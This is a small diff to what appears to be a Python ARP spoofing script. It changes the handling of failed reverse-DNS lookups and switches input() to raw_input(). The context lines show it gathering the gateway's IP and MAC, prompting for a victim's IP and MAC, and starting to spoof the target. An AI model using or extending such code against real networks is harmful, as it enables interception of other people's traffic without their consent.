@@ -55,7 +55,7 @@ for element in answers:
 	except (socket.error, Exception) as error:
 		print("[!] Reverse DNS lookup FAILED!")
 		print("[!] Displaying results anyways...")
-		sys.exit(1) # exit and raise system error code
+		client_name = "UNKNOWN"
 
 	client_list.append([element[1].psrc, element[1].hwsrc])
 
@@ -66,8 +66,8 @@ for element in answers:
 gateway_ip = client_list[0][0]
 gateway_mac = client_list[0][1]
 
-victim_ip = input('IP of spoof target? ')
-victim_mac = input('MAC of spoof target? ')
+victim_ip = raw_input('IP of spoof target? ')
+victim_mac = raw_input('MAC of spoof target? ')
 
 try:
 	print("[*] Spoofing target...")
